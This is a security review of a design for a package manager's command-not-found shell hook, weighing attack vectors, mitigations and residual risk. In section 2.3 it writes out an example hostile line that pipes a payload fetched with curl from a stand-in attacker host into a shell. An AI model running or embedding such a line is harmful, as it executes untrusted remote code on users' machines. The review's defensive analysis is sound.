# Security Review: command-not-found handler (Phase 6)

## Scope

This review evaluates the Security Considerations section drafted in the design document against the full decision context from Decisions 1-3 and the Phase 5 security analysis. It answers four questions: attack vectors not yet considered, sufficiency of identified mitigations, whether any "not applicable" claims are wrong, and residual risk requiring escalation.

---

## 1. Attack Vectors Not Considered

### 1.1 Hook file replacement after install (local privilege escalation path)

The design notes that hook files are embedded in the Go binary via `embed.FS` and written to `$TSUKU_HOME/share/hooks/`. The Security Considerations section does not address what happens if an attacker with local write access to `$TSUKU_HOME` replaces `tsuku.bash` or `tsuku.zsh` after installation.

Every shell the user opens sources this file. A replaced hook file executes in the user's interactive shell context — with full access to shell history, exported secrets, SSH agent sockets, and any credentials in the environment. The attack vector is: attacker writes to `$TSUKU_HOME/share/hooks/tsuku.bash`, waits for the user to open a new shell.

This is a local attack, not remote. The threat model for tsuku's install directory is the same as any `~/bin` path: if an adversary can write to it, they can execute arbitrary code. The risk is real but scoped to the integrity of `$TSUKU_HOME`.

**Gap in the design:** no mention of file permissions on the hooks directory or on the sourced hook files. The hook file should be written with `0644` permissions (not world-writable). The implementation must not create `$TSUKU_HOME/share/hooks/` with permissive umask.

### 1.2 Fish hook path expansion bug (injection in `tsuku.fish`)

Decision 1 includes this snippet in the recommended fish hook:

```fish
if test -x (string replace -- '$HOME' $HOME "${TSUKU_HOME:-$HOME/.tsuku}")/bin/tsuku
    function fish_command_not_found
        "{$TSUKU_HOME}/bin/tsuku" suggest -- $argv[1]
    end
end
```

Two issues are present in this snippet:

First, `"{$TSUKU_HOME}/bin/tsuku"` uses double quotes but the braces are not the correct fish variable syntax — fish uses `$TSUKU_HOME`, not `{$TSUKU_HOME}`. This is likely a draft error, but in its current form the literal string `{$TSUKU_HOME}` would be passed as the command, which would fail to execute. A typo here becomes a silent no-op.

Second, `$argv[1]` is passed unquoted inside the function. In fish, `$argv[1]` expands to zero words if the list is empty, which is fine. But if a shell operator or glob character appears in `$argv[1]`, fish's quoting rules apply. The design's context clarifies that the hook calls `tsuku suggest "$1"` as a quoted argument, not string-interpolated — this is correctly handled in the bash/zsh versions with `"$1"`, but the fish snippet uses unquoted `$argv[1]`. The fish snippet should use `(string escape -- $argv[1])` or ensure the argument is properly quoted.

Neither issue is in the Security Considerations text, which does not mention the fish hook at all.

### 1.3 Binary index corruption or poisoning

`tsuku suggest` reads `$TSUKU_HOME/cache/binary-index.db` via SQLite. The Phase 5 analysis notes this correctly: "SQLite parsing of attacker-controlled input would be a risk if the database came from an external source, but the binary index is built and written by tsuku." However, the design does not address what happens if the database file is replaced by an attacker.

A corrupted or adversarially crafted SQLite file could trigger SQLite parsing bugs (if any exist in the embedded library version), cause `tsuku suggest` to crash, or inject crafted recipe names into the suggestion output that mislead users (e.g., suggesting `tsuku install malicious-tool` in place of the legitimate recipe).

The output injection risk is low because `tsuku suggest`'s output is only human-readable text and the recipe names in the index come from the local cache of the public registry. However, the crash/hang risk merits a timeout: `tsuku suggest` should have a hard timeout (the design already calls for a 50ms budget) that prevents a malformed index from blocking the user's shell indefinitely.

The design mentions the 50ms budget in Decision 3 but does not enforce it at the `tsuku suggest` process level, only implicitly via the expected SQLite lookup speed. A hard timeout in the hook itself (`command -v tsuku && timeout 1 tsuku suggest "$1"`) would prevent a malformed-index hang from blocking every shell prompt.

### 1.4 Environment variable injection via `$TSUKU_HOME`

The hook files use `${TSUKU_HOME:-$HOME/.tsuku}` to construct the path to the tsuku binary. If an attacker can set `TSUKU_HOME` to an arbitrary path before the hook runs — for example, through a `.env` file sourced by a project's shell tooling, or via a malicious `direnv` configuration — they can redirect the hook to execute a binary under their control instead of `~/.tsuku/bin/tsuku`.

This risk already exists for the PATH setup (since `$TSUKU_HOME/env` exports `TSUKU_HOME`), but the command-not-found hook adds a new code path that depends on `$TSUKU_HOME`. The risk is mitigated if the hook's path variable expansion is consistent with the binary that originally set `$TSUKU_HOME`, but it should be acknowledged: the hook's security depends on `$TSUKU_HOME` not being writable by untrusted code in the shell session.

### 1.5 Timing window in rc file writes

The Security Considerations text requires atomic writes for rc file modifications ("write to a temp file, then rename"). The Phase 5 analysis also calls this out correctly. What neither document notes is that the rename must be to the same filesystem as the target file. If `$TMPDIR` is on a different filesystem from `$HOME`, `os.Rename` will fail and the implementation must fall back to a copy-then-delete. This is a correctness issue that becomes a security issue if the fallback path uses a non-atomic copy (leaving a window where the rc file is partially written or empty). The implementation should explicitly handle the cross-filesystem case.

### 1.6 `command -v tsuku` guard and shell function shadowing

Decision 2 uses `command -v tsuku` as the recursion guard. In bash, `command -v` checks the shell's PATH hash and also finds shell functions. If `tsuku` has been defined as a shell function (rather than a binary), `command -v tsuku` returns truthy even though calling `tsuku suggest` would invoke the function, not the binary. A malicious shell function named `tsuku` (installed by a compromised dotfile or shared shell profile) could pass the guard and execute arbitrary code in the command-not-found handler context.

This is a narrow attack path but worth documenting: the guard should ideally check for the binary specifically, not just any definition of `tsuku`. Using `command -pv tsuku` (which searches the standard utility PATH, bypassing aliases and functions) is more precise than `command -v tsuku` in bash, though this requires the tsuku binary to be in the PATH at that point.

---

## 2. Sufficiency of Identified Mitigations

### 2.1 Install script delivery — SUFFICIENT with one gap

The mitigation (HTTPS delivery, checksum verification, manual inspection option) is correct and standard. The one gap: the Security Considerations text says "the install script should validate checksums of any artifacts it fetches before executing them" without specifying where the checksums come from or how they are verified. If the checksums are served from the same CDN or origin as the artifacts, a CDN compromise defeats the check. The implementation should document that checksums must be fetched from a separate, trusted source (e.g., published on GitHub releases, separate from the artifact delivery CDN).

### 2.2 rc file writes — SUFFICIENT

The three controls (atomic write, idempotency check, marker-bounded uninstall) are the correct set. The cross-filesystem rename edge case noted above (section 1.5) is the only gap. The controls as stated are sufficient for the common case.

### 2.3 eval in bash hook — SUFFICIENT for stated scope, incomplete for actual implementation

The Security Considerations text says: "The input is `declare -f` output — the shell's own serialization of a currently-defined function — not user input. This is safe in typical environments."

This is accurate but undersells the actual risk in the specific eval construct from Decision 2:

```bash
eval "_tsuku_original_cnf_handle() $(declare -f command_not_found_handle | tail -n +2)"
```

The `declare -f` output is syntactically constrained, but the *body* of the function can contain subshell executions, command substitutions, and redirects that run when `_tsuku_original_cnf_handle` is later invoked. A function body like `() { $(curl http://evil.example/payload | sh); }` survives `declare -f` serialization intact and would execute when the tsuku wrapper calls the original handler.

The Security Considerations text acknowledges users "should audit their existing `command_not_found_handle`" — this is the correct advice, but the framing ("safe in typical environments") may give implementers false confidence that the eval is unconditionally safe. The mitigation is adequate but should be worded more precisely: `declare -f` produces syntactically valid shell, so there is no eval injection risk from bash's serializer, but the semantic content of an adversarially crafted pre-existing handler is not sanitized.

Additionally, the Security Considerations text does not mention that zsh and fish use different — and safer — mechanisms for this step (`functions -c` in zsh, `functions --copy` in fish). The eval concern applies only to the bash hook.

### 2.4 Command name privacy — SUFFICIENT

The mitigation (network-free constraint, godoc comment, code review enforcement) is correct. The additional note from Phase 5 about not echoing the full command in debug output is also appropriate. The concern about terminal session recorders (section 1 of Phase 5's data exposure analysis) is handled: suggestion output already includes the command name by design, so the privacy boundary is the network — not the terminal.

### 2.5 No privilege escalation — SUFFICIENT

The statement is accurate and complete. No gaps.

---

## 3. "Not Applicable" Justifications That Are Actually Applicable

The Security Considerations section does not use explicit "not applicable" language — it omits certain categories rather than dismissing them. Reviewing for implicit "this doesn't apply" assumptions:

### 3.1 Supply chain for hook files — imprecise framing

The Security Considerations text focuses entirely on the install script as the supply chain risk, leaving the hook files and binary index unmentioned. The Phase 5 analysis correctly identifies that hook files are embedded in the binary (same trust as the binary itself), which is accurate for the *initial* install.

However, when `tsuku` self-upgrades and rewrites `$TSUKU_HOME/share/hooks/tsuku.bash`, the upgrade is writing a file that will be sourced in future shell sessions. The trust here is: the upgraded tsuku binary's integrity. If tsuku's update mechanism is compromised (supply chain attack on the release binary), the hook file becomes the execution vector into the user's shell environment. This is not "not applicable" — it is "the same trust as the tsuku binary," which is true, but it understates the impact: a compromised hook file has a wider blast radius than a compromised binary because it executes in every interactive shell session, not only when the user explicitly runs tsuku.

This does not require a design change, but the Security Considerations text should name the tsuku binary's integrity as the root trust anchor for the entire hook mechanism, not just for the install script.

### 3.2 Output injection via `tsuku suggest` output — omitted

The design correctly establishes that `$1` is passed as a quoted argument, preventing shell injection at the hook call site. But neither the Security Considerations text nor the Phase 5 analysis addresses output injection: if `tsuku suggest`'s output is rendered in a terminal emulator, could a crafted recipe name or binary name in the index contain terminal escape sequences that rewrite the user's prompt, exfiltrate terminal content, or execute commands via terminal escape injection?

Terminals that interpret escape sequences in program output are common (xterm, iTerm2, most Linux terminal emulators). The binary index derives recipe names from the public registry — no user-supplied data — so the attack would require a registry compromise first. But the output of `tsuku suggest` should strip or escape terminal control characters before printing, following the same principle as `git`'s output sanitization. The Security Considerations text implicitly treats output as safe by design (recipe names come from a controlled registry), but this is worth stating explicitly.

---

## 4. Residual Risk Requiring Escalation

### 4.1 No escalation required

None of the identified risks rise to the level requiring escalation or a design change. The risks are:

- **Medium (install script delivery):** Standard for the curl-pipe-sh pattern. Well-understood. The existing HTTPS + checksum mitigation is sufficient when checksum distribution follows the recommendation in section 2.1 above.
- **Low (hook file permissions):** Implementation-level concern. Set `0644` on written hook files. Document umask behavior.
- **Low (fish hook syntax):** Draft artifact. The fish snippet in Decision 1 has syntax errors that should be corrected before implementation.
- **Low (eval in bash hook):** Mitigation is correct. Wording in Security Considerations should be more precise. No design change needed.
- **Low (hard timeout for tsuku suggest):** Implementation-level concern. A shell-level `timeout` wrapper in the hook or a Go-level context deadline prevents a corrupted index from hanging the shell.
- **Low (terminal escape sequences in output):** Implementation-level concern. Strip control characters from recipe names and binary names before printing in `tsuku suggest`.

### 4.2 One item to monitor

The `$TSUKU_HOME` environment variable injection vector (section 1.4) should be noted in the Security Considerations text as a known limitation of the design's trust model. It does not require a design change, but users in environments where `direnv` or similar tools can set environment variables before the shell sources `.bashrc` should be aware that `$TSUKU_HOME` controls which binary handles every mistyped command.

---

## Summary of Findings

| Finding | Type | Severity | Action |
|---------|------|----------|--------|
| Hook file permissions not specified | Gap | Low | Add to implementation notes: write hooks with 0644, check umask |
| Fish hook snippet has syntax errors (`{$TSUKU_HOME}`, unquoted `$argv[1]`) | Gap | Low | Fix before implementation |
| No hard timeout on `tsuku suggest` invocation | Gap | Low | Add context deadline or shell-level `timeout` guard |
| eval mitigation framing is imprecise (applies only to bash, not zsh/fish) | Imprecision | Low | Clarify that eval risk is bash-only; zsh and fish use safe copy mechanisms |
| Checksum source not specified (same CDN = no isolation) | Gap | Medium | Specify that checksums must come from a separate trusted source (GitHub releases) |
| Terminal escape sequences in suggest output not addressed | Gap | Low | Strip control characters from index-derived strings before printing |
| `$TSUKU_HOME` injection via untrusted env setters (direnv, etc.) | Omission | Low | Acknowledge as known limitation; document trust assumption |
| `command -v tsuku` guard does not distinguish binary from shell function | Omission | Low | Note; consider `command -pv` for precision |
| Hook file trust anchor (binary integrity) not named explicitly | Imprecision | Low | Name tsuku binary integrity as root trust anchor for hook mechanism |

No findings require escalation or design changes. The design is appropriate for its threat model. The items above are implementation-level notes and documentation clarifications.
